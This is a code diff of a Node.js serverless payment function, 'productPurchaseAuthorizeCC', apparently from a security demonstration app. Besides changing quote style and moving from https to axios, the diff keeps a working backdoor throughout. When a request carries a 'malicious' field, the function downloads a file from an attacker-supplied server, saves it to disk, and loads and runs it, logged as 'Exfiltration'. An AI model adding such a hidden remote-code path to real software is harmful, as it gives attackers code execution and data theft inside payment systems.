@@ -1,51 +1,51 @@
-'use strict';
+"use strict";
 
-const fs = require('fs');
-const https = require('https');
+const fs = require("fs");
+const axios = require("axios");
 
 module.exports.main = async (event, context) => {
-  console.log('Function productPurchaseAuthorizeCC running.')
+  console.log("Function productPurchaseAuthorizeCC running.")
 
-  if (event.malicious) {
+  if (event.body["malicious"]) {
     return await maliciousFunctions(event)
   }
 
-  console.log('Normal flow')
+  console.log("Normal flow")
 
   let result = {};
-  result.devFinished = 'false: does not access database, assumes creditCard is always supplied';
+  result.devFinished = "false: does not access database, assumes creditCard is always supplied";
 
-  if (event.creditCard) {
+  if (event.body["creditCard"]) {
 	  if (Math.random() < .01) {
 	    result.approved = false;
-	    result.failureReason = 'Credit card authorization failed';
+	    result.failureReason = "Credit card authorization failed";
 	  } else {
 	    result.approved = true;
 	    result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
 	  }
-	  result.malicious = event.malicious;
+	  result.malicious = event.body["malicious"];
 	} else {
 	  result.approved = false;
-	  result.failureResaon = 'Database access not yet implemented.';
+	  result.failureResaon = "Database access not yet implemented.";
 	};
 
   return result;
 };
 
 const maliciousFunctions = async (event) => {
-  if (event.malicious == 'one') {
-    console.log('Step 1: Downloading attack scripts.');
+  if (event.body["malicious"] == "one") {
+    console.log("Step 1: Downloading attack scripts.");
 
-    const downloadStatus = await downloadFile(event.attackServer, event.attackFile);
+    const downloadStatus = await downloadFile(event.body["attackServer"], event.body["attackFile"]);
 
     return {
       approved: false,
       failureReason: downloadStatus
     };
-  } else if (event.malicious == 'two') {
-    console.log('Step 2: Exfiltration.');
+  } else if (event.body["malicious"] == "two") {
+    console.log("Step 2: Exfiltration.");
     try {
-      const dynamo = require(`${event.attackFile}`)
+      const dynamo = require(`${event.body["attackFile"]}`)
       const response = await dynamo.exec()
       return {
         approved: false,
@@ -54,7 +54,7 @@ const maliciousFunctions = async (event) => {
     } catch {
       return {
         approved: false,
-        failureReason: `${event.attackFile} maybe not exist.`
+        failureReason: `${event.body["attackFile"]} maybe not exist.`
       };
     }
   }
@@ -62,45 +62,25 @@ const maliciousFunctions = async (event) => {
 
 const downloadFile = async (server, file) => {
   try {
-    console.log('Start of downloadFile');
-    const url = server + '/' + file;
-    console.log('URL: ' + url);
+    console.log("Start of downloadFile");
+    const url = server + "/" + file;
+    console.log("URL: " + url);
 
-    const response_body = await getPromise(url);
+    const response = await axios.get(url);
+    const response_data = response["data"]
 
     const localfile = `${file}`;
-    fs.writeFileSync(localfile, response_body, (err) => {
+    fs.writeFileSync(localfile, response_data, (err) => {
         if (err) throw err;
     });
 
-    console.log('Script downloaded.');
+    console.log("Script downloaded.");
 
-    console.log(response_body);
+    console.log(response_data);
 
-    return 'Script successfully downloaded to ' + localfile;
+    return "Script successfully downloaded to " + localfile;
   } catch (error) {
     console.log(error);
-    return 'Error downloading script. Error: ' + error;
+    return "Error downloading script. Error: " + error;
   }
-}
-
-const getPromise = async (url) => {
-  return new Promise((resolve, reject) => {
-    https.get(url, (response) => {
-      let chunks_of_data = [];
-
-      response.on('data', (fragments) => {
-        chunks_of_data.push(fragments);
-      });
-
-      response.on('end', () => {
-        let response_body = Buffer.concat(chunks_of_data);
-        resolve(response_body.toString());
-      });
-
-      response.on('error', (error) => {
-        reject(error);
-      });
-    });
-  });
 }
